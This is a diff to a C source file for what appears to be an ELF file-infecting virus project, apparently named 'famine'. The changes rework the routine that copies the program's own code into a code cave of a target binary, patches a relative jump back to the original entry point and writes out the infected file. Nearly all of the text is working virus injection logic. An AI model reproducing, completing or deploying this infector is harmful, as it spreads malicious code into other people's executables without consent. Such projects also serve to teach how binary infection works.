@@ -19,28 +19,14 @@ extern void end();
 extern void real_start();
 void famine(void);
 
-#define JMP_OFFSET 0xc - 0x4
+#define JMP_OFFSET 0x6
 #define JMP_SIZE 4
 
 void	_start(void)
 {
-	//__asm__ volatile (	"pushfq\n" \
-	//					"push %rax\n" \
-	//					"push %rdx\n" \
-	//					"push %rsi\n" \
-	//					"push %rdi\n" \
-	//					"call famine\n" \
-	//					"pop %rdi\n" \
-	//					"pop %rsi\n" \
-	//					"pop %rdx\n" \
-	//					"pop %rax\n" \
-	//					"popf\n" \
-	//					"jmp end\n");
 	__asm__ (".global real_start\n"
 			"real_start:\n"
-			"push %rdx\n"
 			"call famine\n"
-			"pop %rdx\n"
 			"jmp end\n");
 
 }
@@ -56,7 +42,7 @@ static int	patch_new_file(t_data *data, const char *filename) {
 
 	_syscall(SYS_unlink, woody);
 
-	int fd = _syscall(SYS_open, woody, O_CREAT | O_WRONLY | O_TRUNC, 0755);
+	int fd = _syscall(SYS_open, woody, O_CREAT | O_WRONLY | O_TRUNC, data->elf.mode);
 	if (fd == -1)
 		return 1;
 
@@ -81,45 +67,19 @@ static int	calculate_jmp(t_data *data) {
 	return 0;
 }
 
-//int	calculate_jmp(t_data *data) {
-//
-//		data->cave.rel_jmp =  \
-//		(int64_t)data->cave.old_entry - \
-//		((int64_t)data->cave.addr + (int64_t)g_payload_size);
-//
-//	return 0;
-//}
-//void modify_payload(int64_t value, size_t offset, size_t size, uint8_t *payload, size_t payload_size) {
-//
-//	for (size_t i = size; i > 0; i--) {
-//		payload[payload_size - offset] = value & 0xFF;
-//		value >>= 8;
-//		offset--;
-//	}
-//}
-
-#define ALIGN_UP(x, a)	(((x) + (a) - 1) & ~((a) - 1))
-
 static int	inject(t_data *data) {
 	
-	//unsigned long size = (unsigned long)&end - (unsigned long)&_start;
-	unsigned long size = (unsigned long)&end - (unsigned long)&real_start;
-
+	unsigned long size = data->payload_size;
 
 	if (bss(data, size) == 1) {
 		return 1;
 	}
 
-
 	calculate_jmp(data);
-	//modify_payload(data->cave.rel_jmp, JMP_OFFSET, sizeof(data->cave.rel_jmp), (uint8_t *)g_payload, g_payload_size);
 
-	//ft_memcpy(data->file + data->cave.offset, g_payload, g_payload_size);
 	ft_memcpy(data->file + data->cave.offset, &real_start, size);
 
-
 	ft_memcpy(data->file + data->cave.offset + JMP_OFFSET, &data->cave.rel_jmp, JMP_SIZE);
-	
 
 	return 0;
 }
@@ -127,29 +87,23 @@ static int	inject(t_data *data) {
 static int	infect(const char *filename)
 {
 
-	size_t size = 0;
-	void *file = map_file(filename, &size);
-	if (file == NULL) {
+	t_data data;
+	ft_memset(&data, 0, sizeof(t_data));
+
+	data.payload_size = (unsigned long)&end - (unsigned long)&real_start;
+
+	if (map_file(filename, &data) != 0) {
 		return 1;
 	}
-	
-	t_data data;
-	init_data(&data, file, size);
 
-	data.virus_size = (char *)&end - (char *)&_start;
+	updade_hdr(&data);
 
-	//if (map_file(filename, &data) == -1) {
-	//	return 1;
-	//}
-
-	//updade_hdr(&data);
-
-	if (inject(&data) == 1) {
+	if (inject(&data) != 0) {
 		free_data(&data);
 		return 1;
 	}
 
-	if (patch_new_file(&data, filename) == 1) {
+	if (patch_new_file(&data, filename) != 0) {
 		free_data(&data);
 		return 1;
 	}
@@ -158,9 +112,6 @@ static int	infect(const char *filename)
 	free_data(&data);
 	return 0;
 }
-
-// utils
-
 
 static void	open_file(char *file)
 {
